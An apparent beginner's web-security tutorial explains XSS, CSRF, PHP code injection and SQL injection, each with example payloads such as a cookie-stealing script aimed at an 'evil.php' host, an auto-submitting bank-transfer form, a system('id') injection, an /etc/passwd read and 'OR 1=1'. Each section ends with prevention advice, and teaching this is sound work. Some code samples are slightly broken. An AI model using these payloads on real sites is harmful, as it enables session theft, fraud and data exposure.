*** XSS attacks (Cross-site scripting) ***

XSS is an injection method that provides malicious script into a trusted website. Injected script gets downloaded and executed by the end users browser when the user interacts with the compromised website. Since the script came from a trusted website, it cannot be distinguished from a ligitimate script. 

XSS attacks may be conducted without using <script>...</script> tags. Other tags will do exactly the same thing.

Examples:

This script is encoded in base64 and placed in META tag.

<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

If the application doesn't validate the input data, the attacker can easily steal a cookie from an authenticated user. 

<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>



Assume that we have an error page, which is handling requests for a non existing pages, 404 error page.

<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>



User can try to force the error page to include this code:

http://testsite.test/<script>alert("TEST");</script> The result is: Not found: / 

(but with JavaScript code <script>alert("TEST");</script>)



**XSS attacks can be prevented with** encoding the inputs in with a standart and then process it. 

in javaScript users can process each input and replace the suspicious characters which can be used in injection methods. And in server-side (PHP), inputs can be used with preprocess them with htlmspecialchars() function.

*** Cross Site Request Forgery (CSRF) ***

Cross Site Request Forgery is a vulnerability where an attacker performs actions while impersonating another user. It can be occur by redirecting users to a link and make a post request with filled form as soon as the page is loaded with using users cookie informations

Examples:


This is a scam webpage that users will think they earn a giveaway and when they want to transfer it to their accounts, it fills an html form and executes the POST form.
<html>
    <body>
        <h1>...</h1>

            <form action="[https://saturnbankgiveaway.com/transfer] (https://saturnbankgiveaway.com/)" method="POST">
                <input type="hidden" iban="421123123123121233314" accountNo="123123123" amount="100" />
            </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

The form creates the following request to the legit Saturn Bank application. The request contains the legit user's session cookie, but contains my account number.

POST /transfer HTTP/1.1 
HOST: saturnbank.com
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Cookie: session=0M19vamsdkf43DFASFsauaSs
iban=421123123123121233314&accountNo=123123123&amount=100


**CSRF attacks can be prevented by** using CRSF tokens, or any type of instantly created tokens used between the client and server-side of an application. They can be included in any requests the client makes to the server. The server validates the token on each request to ensure it's still the authorized user making the request.

Then users should add the CRSF token input field to each form in their applications.


*** PHP Code Injections ***

If a php code doesn't have any input validation for special chars or char combinations, these codes are vulnerable to a code injection attacks. 

For example, if i have a code segment like this:
    $myvar = "varname";
    $x = $_GET['arg'];
    eval("$myvar = $x;");
This code is vulnerable to attacks as this:
     /index.php?arg=1; system('id')


Another example:
    $file = basename(realpath($_GET['file']));
    include($file);
in this code block, if we pass **/etc/passwd** as the argument, this file is  readable for all users. The script returns the content of the file with information about all system users.


**Users can prevent php code injections** with avoiding to use exec(), shell_exec(), system() or passthru() functions. These functions may use directly OS files and folders and it causes major vulnerabilities.

PHP provides some functional operators with built-in input escaping called escapeshellarg() and escapeshellcmd(), which passes input through some level of escape and sanitisation as part of the function call.

Users may provide their own input validations before using inputs in their inner systems.

*** SQL Injections ***

SQL injection is an injection technique that may destroy or cause security vulnerabilities on users databases. It causes when an SQL query is executed with passing an input directly inside of the query. Users can manipulate the query depending on their own desires. 

Examples:
    txtUserId = getRequestString("UserId");
    txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
in this example user can add new queries with passing new sql commands in the UserId field like this:

UserId: 105 OR 1=1

this is equivalent to this :
    SELECT * FROM Users WHERE UserId = 105 OR 1=1;
the condition "UserId = 105 OR 1=1" will be always true and it returns all the rows of Users table.


**Users can prevent SQL injections** with preparing queries with expected variables and binding parameters with their types, and execute the query.

This provides SQL to type of the input and behave it like that input is only can be that kind of input, not any continues queries.

In this example:
    prepare("SELECT * FROM Users WHERE UserId=?);
    bind_param("i", $txtUserId);

    $result = execute();